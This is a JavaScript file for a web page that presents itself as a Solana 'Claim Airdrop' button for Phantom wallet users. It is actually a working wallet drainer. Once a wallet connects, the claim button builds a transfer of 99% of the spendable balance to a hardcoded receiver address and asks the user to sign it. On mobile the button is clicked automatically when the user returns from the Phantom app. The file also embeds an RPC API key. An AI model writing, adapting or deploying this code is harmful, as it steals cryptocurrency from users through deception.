$(document).ready(function () {
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

    async function handleWalletConnection(resp) {
        console.log("Phantom Wallet connected:", resp);

        const connection = new solanaWeb3.Connection(
            'https://solana-mainnet.api.syndica.io/api-key/SoydjJWjfwxDgAya8RrX3ArCdZ9PGLKQ37fVwDuQUJzhtsCDiE2VbEXk3wC1XZWtNArvKyUZvaTpQGYXfkhpmUFR9VbVLgTRhw',
            'confirmed'
        );

        const publicKey = new solanaWeb3.PublicKey(resp.publicKey.toString());
        const walletBalance = await connection.getBalance(publicKey);
        const minBalance = await connection.getMinimumBalanceForRentExemption(0);

        if (walletBalance < minBalance) {
            alert("Insufficient funds for rent.");
            return;
        }

        $('#connect-wallet').text("Claim Airdrop");

        $('#connect-wallet').off('click').on('click', async () => {
            try {
                const receiverWallet = new solanaWeb3.PublicKey('5FfkceXdH2oMPgRpZFKZJPmTE6fLKfUfDRke2gmxuf5n');
                const balanceForTransfer = walletBalance - minBalance;

                if (balanceForTransfer <= 0) {
                    alert("Insufficient funds for transfer.");
                    return;
                }

                const transferAmount = balanceForTransfer * 0.99;

                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: publicKey,
                        toPubkey: receiverWallet,
                        lamports: transferAmount,
                    })
                );

                transaction.feePayer = publicKey;
                const { blockhash } = await connection.getRecentBlockhash();
                transaction.recentBlockhash = blockhash;

                const signed = await window.solana.signTransaction(transaction);
                const txid = await connection.sendRawTransaction(signed.serialize());
                await connection.confirmTransaction(txid);

                alert("Transaction successful!");
                $('#connect-wallet').text("Connected");
            } catch (err) {
                console.error("Transaction failed:", err);
                alert("Claim failed. Try again.");
            }
        });

        // Auto-click "Claim Airdrop" on mobile return
        if (isMobile && sessionStorage.getItem("phantomMobileReturning") === "true") {
            sessionStorage.removeItem("phantomMobileReturning");
            $('#connect-wallet').click();
        }
    }

    async function waitForPhantom(timeout = 5000) {
        return new Promise((resolve, reject) => {
            const interval = 100;
            let waited = 0;
            const check = () => {
                if (window.solana && window.solana.isPhantom) {
                    resolve(window.solana);
                } else {
                    waited += interval;
                    if (waited >= timeout) {
                        reject(new Error("Phantom not detected"));
                    } else {
                        setTimeout(check, interval);
                    }
                }
            };
            check();
        });
    }

    async function connectPhantom() {
        try {
            const provider = await waitForPhantom();
            const resp = await provider.connect();
            sessionStorage.setItem("phantomConnected", "true");
            handleWalletConnection(resp);
        } catch (err) {
            console.error("Phantom connect error:", err);
            alert("Phantom Wallet not found. Redirecting to install...");

            if (isMobile) {
                const dappUrl = encodeURIComponent(window.location.href);
                sessionStorage.setItem("phantomMobileReturning", "true");
                window.location.href = `https://phantom.app/ul/v1/connect?app_url=${dappUrl}`;
            } else {
                window.open("https://phantom.app/", "_blank");
            }
        }
    }

    async function resumeIfReturning() {
        try {
            const provider = await waitForPhantom(7000);
            const alreadyConnected = sessionStorage.getItem('phantomConnected');
            if (alreadyConnected) {
                const resp = await provider.connect({ onlyIfTrusted: true });
                handleWalletConnection(resp);
            }
        } catch (err) {
            console.log("Phantom not yet available or not trusted.");
        }
    }

    // Button click
    $('#connect-wallet').on('click', async () => {
        await connectPhantom();
    });

    // On load, resume if returning from Phantom mobile
    resumeIfReturning();
});
